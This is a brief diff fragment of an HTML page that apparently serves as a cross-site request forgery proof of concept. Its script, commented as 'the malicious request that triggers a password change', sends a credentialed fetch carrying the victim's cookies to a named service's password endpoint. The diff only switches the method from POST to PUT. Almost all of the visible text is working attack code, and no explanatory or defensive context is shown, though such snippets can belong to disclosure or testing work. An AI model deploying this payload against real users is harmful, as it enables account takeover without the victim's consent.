@@ -9,7 +9,7 @@
     <script>
       // The malicious request that triggers a password change
       fetch('https://app.fing.com/rest/users/password', {
-        method: 'POST',
+        method: 'PUT',
         credentials: 'include', // Ensures the victim's cookies are sent along
         headers: {
           'Content-Type': 'application/json'
